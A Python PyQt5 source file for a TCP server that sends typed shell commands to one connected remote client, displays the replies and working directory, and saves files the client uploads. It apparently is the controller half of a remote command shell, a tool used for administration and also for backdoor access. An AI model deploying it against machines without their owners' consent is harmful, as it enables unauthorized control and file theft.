
import sys
from PyQt5.QtNetwork import QTcpSocket, QTcpServer, QHostAddress
from PyQt5.QtCore import (QCoreApplication, QObject, QDataStream,
                         QJsonDocument, QByteArray,
                         QJsonParseError, QThread, pyqtSignal,
                        pyqtSlot, QDir, QFile, QIODevice)

import faulthandler
import json

faulthandler.enable()

class InputThread(QThread):

    commandReady = pyqtSignal(dict)

    def __init__(self, parent: QObject = None) -> None:
        super(QThread, self).__init__(parent)
        self.currentDir = "> "
    
    def run(self) -> None:
        command = input(self.currentDir)
        if not command:
            return self.run()

        self.prepareCommand(command)

    def prepareCommand(self, cmd : str):
        program = cmd.split(" ")[0]
        if program == "exit":
            QCoreApplication.exit(0)
        args = cmd.split(" ")[1:]

        command = {}
        command["program"] = program
        command["args"] = " ".join(args)

        self.commandReady.emit(command)
        

    def setCurrentDir(self, current : str):
        self.currentDir = current + "> ";



class Client(QObject):
    clientDisconnected = pyqtSignal(str, int)

    def __init__(self, clientSocket : QTcpSocket):
        super(QObject, self).__init__()

        self.clientSocket = clientSocket
        self.inputThread = InputThread()
        self.dataStream = QDataStream(self.clientSocket)
        self.inputThread.commandReady.connect(self.onCommandReady)
        self.clientSocket.readyRead.connect(self.onReadyRead)
        self.clientSocket.disconnected.connect(self.onClientDisconnected)
        self.onCommandReady({"program" : "echo Root_", "args" : ""})

    def onReadyRead(self):
        stream = QDataStream(self.clientSocket)
        while 1:
            stream.startTransaction()
            data = stream.readBytes()
            if (stream.commitTransaction()):
                err = QJsonParseError();
                jsonDoc = QJsonDocument.fromJson(data, err)
                if (err.error == QJsonParseError.ParseError.NoError):
                    self.handleJson(jsonDoc)

            else:
                break
    def handleJson(self, jsonDoc : QJsonDocument):
        response = jsonDoc.object()
        self.inputThread.setCurrentDir(response["cwd"].toString())
        print(response["res"].toString())
        if "data" in response:
            data = QByteArray.fromBase64(response["data"].toString().encode())
            self.writeData(data, response["filename"].toString())
            
        self.inputThread.start()

    def writeData(self, data : bytes, filename : str):
        destinationPath = QDir(QDir.homePath() + "/serverfiles")
        if not destinationPath.exists():
            destinationPath.mkpath(destinationPath.path())
        
        out = QFile(destinationPath.path() + "/" + filename)
        if out.open(QIODevice.OpenModeFlag.WriteOnly):
            out.write(data)
            out.close()

    @pyqtSlot(dict)
    def onCommandReady(self, command : dict):
        if self.clientSocket.isOpen() and self.clientSocket.isWritable():
            #stream = QDataStream(self.clientSocket)
            data = json.dumps(command)
            #json = doc.toJson(QJsonDocument.JsonFormat.Compact)
            self.dataStream.writeBytes(data.encode())
            #self.dataStream.writeBytes(QJsonDocument(command).toJson(QJsonDocument.JsonFormat.Compact))

    def onClientDisconnected(self, *args):
        self.clientDisconnected.emit(self.clientSocket.peerAddress().toString(), self.clientSocket.peerPort)

    def getInfo(self) -> tuple:
        return self.clientSocket.peerAddress().toString(), self.clientSocket.peerPort()



class Server(QTcpServer):
    def __init__(self):
        super(QTcpServer, self).__init__()
        self.client = None

    def startServer(self):
        self.newConnection.connect(self.onNewConnection)
        
        if (self.listen(QHostAddress.SpecialAddress.Any, 9003)):
            print("Server listening to port 9003")
        
        else:
            print(f"Error: {self.errorString()}")

    def onNewConnection(self):
        self.client = Client(self.nextPendingConnection())
        print(f"Client connected: {self.client.getInfo()[0]} : {self.client.getInfo()[1]}")
        self.pauseAccepting()

    def onClientDisconnected(self):
        print(f"Client disconneccted: {self.client.getInfo()[0]} : {self.client.getInfo()[1]}")
        self.resumeAccepting()


if __name__ == "__main__":
    app = QCoreApplication(sys.argv)
    server = Server()
    server.startServer()
    sys.exit(app.exec_())
    